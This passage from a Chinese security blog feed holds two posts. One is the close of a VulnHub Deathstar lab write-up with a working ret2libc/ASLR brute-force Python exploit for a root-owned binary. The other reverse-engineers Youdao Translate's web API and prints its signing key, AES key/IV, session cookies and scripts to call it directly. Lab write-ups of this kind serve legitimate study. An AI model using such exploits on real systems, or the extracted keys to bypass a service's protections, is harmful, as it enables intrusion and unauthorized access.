href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h5><p>可以看到每一次地址都是变化的，确认存在 ASLR，但是变化的地址都离的很近</p><p><img src="/../img/vulnhub-deathstar_1.md/42.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">地址空间布局随机化（ASLR）可以帮助克服某些类型的缓冲区溢出攻击，ASLR可以将基数，库，堆和堆栈放在进程地址空间中的任意随机位置，这使攻击程序很难预测下一条指令的内存地址。<br>ASLR内置在Linux内核中，并由参数控制 /proc/sys/kernel/randomize_va_space,该 randomize_va_space参数可以采用以下值：<br>  0 : 禁用ASLR。如果使用norandmapsboot参数引导内核，则将应用此设置。<br>  1 : 随机化堆栈，虚拟动态共享对象（VDSO）页面和共享内存区域的位置。数据段的基地址位于可执行代码段的结尾之后。<br>  2 : 随机化堆栈，VDSO页，共享内存区域和数据段的位置。这是默认设置。<br></code></pre></td></tr></table></figure><p><img src="/../img/vulnhub-deathstar_1.md/43.png"></p><p>看看当前用户可否关闭 ASLR</p><p><img src="/../img/vulnhub-deathstar_1.md/44.png"></p><h6 id="绕过-ASLR"><a href="#绕过-ASLR" class="headerlink" title="绕过 ASLR"></a>绕过 ASLR</h6><p>撞 ASLR 地址，为什么撞？因为该 elf 程序是 32 位的，可以在使用更复杂的方法之前尝试一下</p><p><strong>找偏移地址：</strong></p><p><img src="/../img/vulnhub-deathstar_1.md/45.png"></p><p><img src="/../img/vulnhub-deathstar_1.md/46.png"></p><p>libc 地址：0xb7603000</p><p>exit@@GLIBC_2.0 地址：00033260</p><p>system@@GLIBC_2.0 地址：00040310</p><p>使用 sh 不用 bash，找 sh 的地址：（防止因 bash 的安全机制拿不到 shell）</p><p><img src="/../img/vulnhub-deathstar_1.md/47.png"></p><h3 id="总结利用逻辑"><a href="#总结利用逻辑" class="headerlink" title="总结利用逻辑"></a>总结利用逻辑</h3><p>发现 dartVader 是一个由 <strong>root</strong> 拥有的二进制文件，初步简单<strong>交互无法实现提权</strong>；</p><p>通过<strong>反编译</strong>分析，观察到程序中存在<strong>缓冲区溢出漏洞（strcpy）</strong>，因为程序开启了 NX 保护，栈区不可执行 shellcode；</p><p>通过** ldd <strong>发现了程序链接了 libc 动态链接库，尝试使用</strong> ret2libc 攻击**，通过<strong>调用库中已有的函数 system，绕过程序的 nx 保护；</strong></p><p>但是目标环境启用了 <strong>ASLR</strong>，导致内存地址随机化，但是地址变化范围较小，尝试使用<strong>碰撞</strong>地址，绕过 ASLR；</p><p>通过构造 <strong>rop 链</strong>并循环猜测出 system 函数的地址，然后<strong>在 system 函数中执行 shell 命令</strong>，试图提权；</p><p>通过推测 libc 的基地址和 system 等函数的偏移关系，然后利用这一关系在循环中复现正确的内存布局，尝试命中目标地址。</p><h4 id="地址碰撞"><a href="#地址碰撞" class="headerlink" title="地址碰撞"></a>地址碰撞</h4><p><img src="/../img/vulnhub-deathstar_1.md/48.png"></p><p>锁定偏移为 76</p><p>最终 ret2libc.py 脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!/usr/bin/env python3<br># -*- coding:utf-8 -*-<br>from struct import pack<br>from subprocess import call<br><br>offset = b&quot;A&quot; * 76<br>libc = 0xb7603000<br>system = pack(&quot;&lt;I&quot;,libc + 0x00040310)<br>exit = pack(&quot;&lt;I&quot;,libc + 0x00033260)<br>sh = pack(&quot;&lt;I&quot;,libc + 0x162d4c)<br>buffer  = offset + system + exit + sh<br>app = b&quot;/bin/dartVader&quot;<br><br>for i in range(1024):<br>    print(&quot;Attempt %d&quot; % i)<br>    ret = call ([app,buffer])<br>    if ret == 0:<br>        print(&quot;Exploit Successful!&quot;)<br>        break<br>else:<br>    print(&quot;Mission failed&quot;)<br>    <br></code></pre></td></tr></table></figure><p>碰撞地址过程：</p><p><img src="/../img/vulnhub-deathstar_1.md/49.png"></p><p>成功 get root！</p><p><img src="/../img/vulnhub-deathstar_1.md/50.png"></p><p>查看&#x2F;root&#x2F;message.txt 文件</p><p><img src="/../img/vulnhub-deathstar_1.md/51.png"></p><p>Congratulations！！</p><p>参考：</p><p>红队笔记（讲的很好）：<a href="https://www.bilibili.com/video/BV1c8EEznEkv?spm_id_from=333.788.videopod.sections&vd_source=4e9106e7030f1c25677827558da5c605">https://www.bilibili.com/video/BV1c8EEznEkv?spm_id_from&#x3D;333.788.videopod.sections&amp;vd_source&#x3D;4e9106e7030f1c25677827558da5c605</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub靶场</tag>
      
      <tag>ret2libc</tag>
      
      <tag>图片隐写</tag>
      
      <tag>端口敲门</tag>
      
      <tag>ASLR绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某道逆向（翻译软件）</title>
    <link href="/2025/05/26/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91/"/>
    <url>/2025/05/26/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>目标：<a href="https://fanyi.youdao.com/#/TextTranslate">https://fanyi.youdao.com/#/TextTranslate</a></p><h3 id="Pawto">开始分析</h3>抓取得三个包，可看出来是 aes 加密<p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/1.png"></p><p>sign 和时间戳是变化的</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/2.png"></p><h3 id="LTkUz">逆sign</h3><h4 id="QQ0to">1. 搜索 sign</h4><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/3.png"></p><p>根据数据包中的 sign 周围的变量来定位 sign，若断点打不到本行就不是，接着往下找</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/4.png"></p><p>再次翻译，成功断到此处</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/5.png"></p><h4 id="BxQQJ">2.sign(a,e)</h4>a 为：a = (new Date).getTime();<p>e 不知道是什么</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/6.png"></p><p>运行后 e 出了新结果</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/7.png"></p><p>说明 sign(a,e)函数会运行两次</p><p>查看网络中的 sign</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/8.png"></p><p>看最终使用的是第一次的 sign 还是第二次的。</p><p>S 函数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/9.png"></p><p>通过对 1 进行加密判断加密模式是不是 md5</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/10.png"></p><p>client、product、key 的值是固定的</p><h4 id="JOGSR">sign 解密代码</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">CryptoJs</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto-js&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getsign</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">const</span> a = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>).<span class="hljs-title function_">getTime</span>();<br><br>    test = <span class="hljs-string">`client=fanyideskweb&amp;mysticTime=<span class="hljs-subst">$&#123;a&#125;</span>&amp;product=webfanyi&amp;key=Vy4EQ1uwPkUoqvcP1nIu6WiAjxFeA3Y3`</span><br>    sign = <span class="hljs-title class_">CryptoJs</span>.<span class="hljs-title class_">MD5</span>(test).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">return</span> [a,sign]<br><br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getsign</span>());<br><br></code></pre></td></tr></table></figure><h3 id="WPU0g">逆 webtranslate</h3><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/11.png"></p><p>看到一大串数据无从下手，三种可能：</p><p>JSON.parse</p><p>decrypt</p><p>join</p><p>:::</p><p>定位：</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/12.png"></p><p>da.A.decodeData(o, ha.A.state.text.decodeKey, ha.A.state.text.decodeIv)的结果已经是 json 字符串了</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/13.png"></p><p>分析 json 解密的函数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/14.png"></p><p>传入 e   t   a 三个参数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/15.png"></p><p>const o 和 n 为固定值</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/16.png"></p><p>目前 js 状态：</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/17.png"></p><p>arg 为 O 函数传入的 e</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/18.png"></p><h3 id="uBPVj">Py 脚本</h3><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/19.png"></p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/20.png"></p><h4 id="Lfn38">得到密文</h4><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/21.png"></p><p>运行 py 脚本，得到值（这个值是服务器传给客户端的密文）</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/22.png"></p><h4 id="nUGim">解密</h4><p>调用 js 的解密函数</p><p><img src="/../img/%E6%9F%90%E9%81%93%E9%80%86%E5%90%91.md/23.png"></p><p>运行 py</p><p>终端就可以进行翻译了~</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">CryptoJs</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto-js&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getsign</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> a = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>).<span class="hljs-title function_">getTime</span>();<br><br>    test = <span class="hljs-string">`client=fanyideskweb&amp;mysticTime=<span class="hljs-subst">$&#123;a&#125;</span>&amp;product=webfanyi&amp;key=Vy4EQ1uwPkUoqvcP1nIu6WiAjxFeA3Y3`</span><br>    sign = <span class="hljs-title class_">CryptoJs</span>.<span class="hljs-title class_">MD5</span>(test).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">return</span> [a, sign]<br><br>&#125;<br><span class="hljs-comment">//console.log(getsign());</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">translate_response</span>(<span class="hljs-params">text</span>) &#123;<br>    <span class="hljs-comment">// text 是 base64 字符串</span><br>    <span class="hljs-keyword">const</span> key = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>([<span class="hljs-number">8</span>, <span class="hljs-number">20</span>, <span class="hljs-number">157</span>, <span class="hljs-number">167</span>, <span class="hljs-number">60</span>, <span class="hljs-number">89</span>, <span class="hljs-number">206</span>, <span class="hljs-number">98</span>, <span class="hljs-number">85</span>, <span class="hljs-number">91</span>, <span class="hljs-number">1</span>, <span class="hljs-number">233</span>, <span class="hljs-number">47</span>, <span class="hljs-number">52</span>, <span class="hljs-number">232</span>, <span class="hljs-number">56</span>]);<br>    <span class="hljs-keyword">const</span> iv = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>([<span class="hljs-number">210</span>, <span class="hljs-number">187</span>, <span class="hljs-number">27</span>, <span class="hljs-number">253</span>, <span class="hljs-number">232</span>, <span class="hljs-number">59</span>, <span class="hljs-number">56</span>, <span class="hljs-number">195</span>, <span class="hljs-number">68</span>, <span class="hljs-number">54</span>, <span class="hljs-number">99</span>, <span class="hljs-number">87</span>, <span class="hljs-number">183</span>, <span class="hljs-number">156</span>, <span class="hljs-number">174</span>, <span class="hljs-number">28</span>]);<br>    <span class="hljs-keyword">const</span> decipher = crypto.<span class="hljs-title function_">createDecipheriv</span>(<span class="hljs-string">&#x27;aes-128-cbc&#x27;</span>, key, iv);<br>    <span class="hljs-keyword">let</span> decrypted = decipher.<span class="hljs-title function_">update</span>(text, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>    decrypted += decipher.<span class="hljs-title function_">final</span>(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(decrypted);<br>&#125;<br><br><span class="hljs-comment">//arg = &#x27;Z21kD9ZK1ke6ugku2ccWu4n6eLnvoDT0YgGi0y3g-v0B9sYqg8L9D6UERNozYOHqnYdl2efZNyM6Trc_xS-zKtfTK4hb6JP8XwCzNh0avc8qItQUiIU_4wKKXJlIpvMvfKvJaaZzaX6VEtpkr2FdkfoT_Jgbm2GRSVj3r40autIdlImENG8hC0ZH4ww7utwuTt3Oo_ZpXg0BSq9wePSAB75-ChkiGKF9HTIPeCl2bl84SBD1XDfFCZpkKQhecYSs0JLoXOqP2ltavxRrg58Hp1q5uIgZZ_Oo2-Jmd-t1r4es40drcAq5bjmS62M2VJF8D6ojtOh9JTfNwgzD3CxYn-Pd7-TgHMyNEJEkFXTAyxzpjlFqtrCYDE3SZUYlENkqsL8Wrra1hM-1nTfiB-BLcWAdRBynNpP5_54aq_-GBsq8bB_9yEX5ovzDB4_Ry_spVVuUnb39iplMHCdCnjOD3ngiIDbl9SUz-9npjBX05ZYRdPmFPAl424qdoaxeVqnVoH8jQFPZVqaHMzu4mJg0SICDWFH7GP1zqGRbXd3ESjT_iBInl3gICt2XVuhh_nubcELkTEC6xbqEDRQkPUNMpzXJHjcvsLHtcmSW0S9F0445ho9kT2qZYdMBC3Fs0OaHpUtFu77gZpQn7sGiqh8VliXIcUtfvvop-1c-Vu5QjfUbLn2-s5POR9fGYG6rt6ioe_PGmwWj-Cc00zUM7FybfarKTr4D3Rk57R72qpXN4Ja86ZsCAMmDG-m5z31RQh_V7echJ8Kna3Go3yWKCK4vtSwOWrFhiS5RTz6EkrGc3SkFKbb5vp8Wop_84myBtgnBmj4CczhTq2HcOxrJf4def6yDt2uBxyv4bTVGx9Yx3uB4Gx0iK5kYvfma6B_LnkRWk331wjuXKQtBGYIuWkR8J5QtvBmIRVaa7AA19Z4xMIEAqbcuQ5p4I9FCElthBrJdtEr4l29PhwKfsA7pYeU2EJLRrRK42WQpEy0Xwx_2Lz2e3Rlf-L467aRO7RmuvBXD-J_H0IwaArTP7K3_ZeSUzEvCicixstp94kzkLHCsyJHZXiR3YTq3t7lmNgpfDbb-&#x27;</span><br><span class="hljs-comment">//console.log(translate_response(&#x27;Z21kD9ZK1ke6ugku2ccWu4n6eLnvoDT0YgGi0y3g-v0B9sYqg8L9D6UERNozYOHqnYdl2efZNyM6Trc_xS-zKtfTK4hb6JP8XwCzNh0avc8qItQUiIU_4wKKXJlIpvMvfKvJaaZzaX6VEtpkr2FdkfoT_Jgbm2GRSVj3r40autIdlImENG8hC0ZH4ww7utwuTt3Oo_ZpXg0BSq9wePSAB75-ChkiGKF9HTIPeCl2bl84SBD1XDfFCZpkKQhecYSs0JLoXOqP2ltavxRrg58Hp1q5uIgZZ_Oo2-Jmd-t1r4es40drcAq5bjmS62M2VJF8D6ojtOh9JTfNwgzD3CxYn-Pd7-TgHMyNEJEkFXTAyxzpjlFqtrCYDE3SZUYlENkqsL8Wrra1hM-1nTfiB-BLcWAdRBynNpP5_54aq_-GBsq8bB_9yEX5ovzDB4_Ry_spVVuUnb39iplMHCdCnjOD3ngiIDbl9SUz-9npjBX05ZYRdPmFPAl424qdoaxeVqnVoH8jQFPZVqaHMzu4mJg0SICDWFH7GP1zqGRbXd3ESjT_iBInl3gICt2XVuhh_nubcELkTEC6xbqEDRQkPUNMpzXJHjcvsLHtcmSW0S9F0445ho9kT2qZYdMBC3Fs0OaHpUtFu77gZpQn7sGiqh8VliXIcUtfvvop-1c-Vu5QjfUbLn2-s5POR9fGYG6rt6ioe_PGmwWj-Cc00zUM7FybfarKTr4D3Rk57R72qpXN4Ja86ZsCAMmDG-m5z31RQh_V7echJ8Kna3Go3yWKCK4vtSwOWrFhiS5RTz6EkrGc3SkFKbb5vp8Wop_84myBtgnBmj4CczhTq2HcOxrJf4def6yDt2uBxyv4bTVGx9Yx3uB4Gx0iK5kYvfma6B_LnkRWk331wjuXKQtBGYIuWkR8J5QtvBmIRVaa7AA19Z4xMIEAqbcuQ5p4I9FCElthBrJdtEr4l29PhwKfsA7pYeU2EJLRrRK42WQpEy0Xwx_2Lz2e3Rlf-L467aRO7RmuvBXD-J_H0IwaArTP7K3_ZeSUzEvCicixstp94kzkLHCsyJHZXiR3YTq3t7lmNgpfDbb-&#x27;));</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> execjs<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><br><br><br>cookies = &#123;<br>    <span class="hljs-string">&#x27;OUTFOX_SEARCH_USER_ID&#x27;</span>: <span class="hljs-string">&#x27;-39140274@218.106.117.234&#x27;</span>,<br>    <span class="hljs-string">&#x27;OUTFOX_SEARCH_USER_ID_NCOO&#x27;</span>: <span class="hljs-string">&#x27;1017813054.5103312&#x27;</span>,<br>    <span class="hljs-string">&#x27;DICT_DOCTRANS_SESSION_ID&#x27;</span>: <span class="hljs-string">&#x27;NGI5MmMzZTktYmY5ZS00Njg1LTkwODMtODZlZjI2OTA5YzZh&#x27;</span>,<br>    <span class="hljs-string">&#x27;_uetsid&#x27;</span>: <span class="hljs-string">&#x27;b1a3a4202e6211f09ed8910f851b0f84&#x27;</span>,<br>    <span class="hljs-string">&#x27;_uetvid&#x27;</span>: <span class="hljs-string">&#x27;0a3206b0b5e211ef97071f44ad9eeb40&#x27;</span>,<br>&#125;<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ar;q=0.5&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>    <span class="hljs-string">&#x27;DNT&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;https://fanyi.youdao.com&#x27;</span>,<br>    <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;https://fanyi.youdao.com/&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;cors&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-site&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua&#x27;</span>: <span class="hljs-string">&#x27;&quot;Chromium&quot;;v=&quot;136&quot;, &quot;Microsoft Edge&quot;;v=&quot;136&quot;, &quot;Not.A/Brand&quot;;v=&quot;99&quot;&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="hljs-string">&#x27;?0&#x27;</span>,<br>    <span class="hljs-string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="hljs-string">&#x27;&quot;Windows&quot;&#x27;</span>,<br>    <span class="hljs-comment"># &#x27;Cookie&#x27;: &#x27;OUTFOX_SEARCH_USER_ID=-39140274@218.106.117.234; OUTFOX_SEARCH_USER_ID_NCOO=1017813054.5103312; DICT_DOCTRANS_SESSION_ID=NGI5MmMzZTktYmY5ZS00Njg1LTkwODMtODZlZjI2OTA5YzZh; _uetsid=b1a3a4202e6211f09ed8910f851b0f84; _uetvid=0a3206b0b5e211ef97071f44ad9eeb40&#x27;,</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">youdao</span>(<span class="hljs-params">txt</span>):<br>    jscode = execjs.<span class="hljs-built_in">compile</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;translate.js&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read())  <span class="hljs-comment">#导入刚才写的js文件</span><br>    time_now,sign = jscode.call(<span class="hljs-string">&quot;getsign&quot;</span>)                                  <span class="hljs-comment">#调用js文件中的方法,得到time_now和sign</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;i&#x27;</span>: txt,<br>        <span class="hljs-string">&#x27;from&#x27;</span>: <span class="hljs-string">&#x27;zh-CHS&#x27;</span>,<br>        <span class="hljs-string">&#x27;to&#x27;</span>: <span class="hljs-string">&#x27;en&#x27;</span>,<br>        <span class="hljs-string">&#x27;useTerm&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>        <span class="hljs-string">&#x27;domain&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;dictResult&#x27;</span>: <span class="hljs-string">&#x27;true&#x27;</span>,<br>        <span class="hljs-string">&#x27;keyid&#x27;</span>: <span class="hljs-string">&#x27;webfanyi&#x27;</span>,<br>        <span class="hljs-string">&#x27;sign&#x27;</span>: sign,<br>        <span class="hljs-string">&#x27;client&#x27;</span>: <span class="hljs-string">&#x27;fanyideskweb&#x27;</span>,<br>        <span class="hljs-string">&#x27;product&#x27;</span>: <span class="hljs-string">&#x27;webfanyi&#x27;</span>,<br>        <span class="hljs-string">&#x27;appVersion&#x27;</span>: <span class="hljs-string">&#x27;1.0.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;vendor&#x27;</span>: <span class="hljs-string">&#x27;web&#x27;</span>,<br>        <span class="hljs-string">&#x27;pointParam&#x27;</span>: <span class="hljs-string">&#x27;client,mysticTime,product&#x27;</span>,<br>        <span class="hljs-string">&#x27;mysticTime&#x27;</span>: time_now,<br>        <span class="hljs-string">&#x27;keyfrom&#x27;</span>: <span class="hljs-string">&#x27;fanyi.web&#x27;</span>,<br>        <span class="hljs-string">&#x27;mid&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;screen&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;model&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;network&#x27;</span>: <span class="hljs-string">&#x27;wifi&#x27;</span>,<br>        <span class="hljs-string">&#x27;abtest&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;yduuid&#x27;</span>: <span class="hljs-string">&#x27;abcdefg&#x27;</span>,<br>    &#125;<br>    response = requests.post(<span class="hljs-string">&#x27;https://dict.youdao.com/webtranslate&#x27;</span>, <br>                             cookies=cookies, <br>                             headers=headers, <br>                             data=data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).text<br>    <span class="hljs-comment">#print(response)</span><br><br>    result = jscode.call(<span class="hljs-string">&#x27;translate_response&#x27;</span>,response)<br>    <span class="hljs-comment">#print(result)</span><br>    translate = result[<span class="hljs-string">&#x27;translateResult&#x27;</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;tgt&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;翻译结果为：<span class="hljs-subst">&#123;translate&#125;</span>&#x27;</span>)<br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    txt = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入要翻译的内容：&#x27;</span>)<br>    youdao(txt)<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>js逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建个人博客</title>
    <link href="/2025/05/18/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2025/05/18/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
